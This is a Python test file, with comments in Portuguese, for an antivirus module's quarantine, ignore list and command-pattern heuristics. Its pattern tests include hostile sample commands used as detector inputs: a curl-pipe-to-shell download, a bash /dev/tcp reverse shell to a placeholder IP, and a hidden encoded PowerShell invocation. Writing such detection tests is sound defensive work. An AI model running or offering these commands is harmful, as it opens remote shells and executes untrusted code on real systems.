"""Antivírus: quarentena (ida, volta, integridade, ids únicos) e heurísticas puras."""
import os
import tempfile
import threading
import unittest
from pathlib import Path
from unittest import mock

from nexo.core import antivirus as av
from nexo.core import av_checks, av_quarantine, util


def _blocked(*_a, **_k):
    raise AssertionError("o teste tentou pedir privilégios de administrador")


class TempConfig(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        for p in (mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": self.tmp.name, "APPDATA": self.tmp.name}),
                  mock.patch.object(util, "_settings", None),
                  mock.patch.object(av, "run_root", _blocked),
                  mock.patch.object(av_quarantine, "run_root", _blocked)):
            p.start()
            self.addCleanup(p.stop)
        self.work = Path(self.tmp.name) / "trabalho"
        self.work.mkdir()

    def make(self, name="mau.exe", data=b"MZ\x90\x00conteudo suspeito" * 100, mode=0o755) -> Path:
        f = self.work / name
        f.write_bytes(data)
        os.chmod(f, mode)
        return f


class Quarantine(TempConfig):
    def test_round_trip_keeps_content_and_mode(self):
        data = bytes(range(256)) * 4097           # mais de 1 MiB: atravessa vários blocos
        f = self.make(data=data, mode=0o750)
        ok, _msg = av.quarantine(str(f), "teste")
        self.assertTrue(ok)
        self.assertFalse(f.exists())
        (item,) = av.quarantine_list()
        self.assertEqual(item["size"], len(data))
        self.assertEqual(len(item["sha256"]), 64)
        stored = av._qdir() / f"{item['id']}.nexoq"
        raw = stored.read_bytes()
        self.assertNotEqual(raw[:64], data[:64])   # não fica legível tal e qual
        self.assertNotIn(b"MZ", raw[:2])
        ok, _msg = av.quarantine_restore(item["id"])
        self.assertTrue(ok, _msg)
        self.assertEqual(f.read_bytes(), data)
        if not util.IS_WIN:
            self.assertEqual(os.stat(f).st_mode & 0o777, 0o750)
        self.assertEqual(av.quarantine_list(), [])
        self.assertFalse(stored.exists())
        self.assertEqual([p.name for p in av._qdir().iterdir()], [])   # sem temporários esquecidos

    def test_corrupted_file_is_not_restored(self):
        f = self.make()
        av.quarantine(str(f), "teste")
        (item,) = av.quarantine_list()
        stored = av._qdir() / f"{item['id']}.nexoq"
        os.chmod(stored, 0o600)
        b = bytearray(stored.read_bytes())
        b[10] ^= 0xFF
        stored.write_bytes(bytes(b))
        ok, msg = av.quarantine_restore(item["id"])
        self.assertFalse(ok)
        self.assertIn("danificado", msg)
        self.assertFalse(f.exists())
        self.assertEqual(len(av.quarantine_list()), 1)   # continua na quarentena

    def test_restore_refuses_to_overwrite(self):
        f = self.make()
        av.quarantine(str(f), "teste")
        f.write_bytes(b"outro ficheiro")
        ok, msg = av.quarantine_restore(av.quarantine_list()[0]["id"])
        self.assertFalse(ok)
        self.assertIn("Já existe", msg)
        self.assertEqual(f.read_bytes(), b"outro ficheiro")

    def test_old_entries_without_hash_still_restore(self):
        f = self.make(data=b"antigo")
        av.quarantine(str(f), "teste")
        lst = av.quarantine_list()
        del lst[0]["sha256"]
        util.save_json("quarentena.json", lst)
        ok, _m = av.quarantine_restore(lst[0]["id"])
        self.assertTrue(ok)
        self.assertEqual(f.read_bytes(), b"antigo")

    def test_parallel_quarantines_get_unique_ids(self):
        files = [self.make(f"f{i}.exe", data=f"ficheiro {i}".encode()) for i in range(12)]
        with mock.patch.object(av_quarantine.time, "time", return_value=1_700_000_000.0):   # mesmo milissegundo
            threads = [threading.Thread(target=av.quarantine, args=(str(f), "teste")) for f in files]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
        lst = av.quarantine_list()
        self.assertEqual(len(lst), 12)
        self.assertEqual(len({x["id"] for x in lst}), 12)
        for x in lst:
            self.assertTrue(av.quarantine_restore(x["id"])[0])
        self.assertEqual(sorted(f.read_bytes() for f in files), sorted(f"ficheiro {i}".encode() for i in range(12)))

    def test_delete(self):
        f = self.make()
        av.quarantine(str(f), "teste")
        qid = av.quarantine_list()[0]["id"]
        self.assertTrue(av.quarantine_delete(qid)[0])
        self.assertEqual(av.quarantine_list(), [])
        self.assertFalse((av._qdir() / f"{qid}.nexoq").exists())
        self.assertFalse(av.quarantine_restore(qid)[0])

    def test_missing_file(self):
        self.assertFalse(av.quarantine(str(self.work / "nao-existe"), "teste")[0])
        self.assertFalse(av.quarantine_restore("123")[0])


class Ignore(TempConfig):
    def test_ignore_and_clear(self):
        f = av.Finding(av.WARN, "Ficheiro", "x", "y", path="/tmp/a")
        av.ignore(f)
        av.ignore(f)
        self.assertEqual(util.load_json("av_ignorar.json", []), [f.key])
        self.assertEqual(av.clear_ignored(), 1)
        self.assertEqual(util.load_json("av_ignorar.json", None), [])


class Patterns(unittest.TestCase):
    def test_linux_commands(self):
        with mock.patch.object(av_checks, "IS_WIN", False):
            self.assertEqual(av._match("curl http://x.example/a.sh | sh")[0], av.WARN)
            self.assertEqual(av._match("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")[0], av.BAD)
            self.assertIsNone(av._match("ls -la /home"))
            # .bashrc: executar de /tmp não conta (é normal em scripts de shell)
            self.assertIsNone(av._match("/tmp/script.sh", shell_rc=True))
            self.assertIsNotNone(av._match("/tmp/script.sh"))

    def test_windows_commands(self):
        with mock.patch.object(av_checks, "IS_WIN", True):
            self.assertEqual(av._match("powershell -w hidden -enc " + "A" * 60)[0], av.BAD)
            self.assertIsNone(av._match(r"C:\Program Files\Steam\steam.exe -silent"))


if __name__ == "__main__":
    unittest.main()
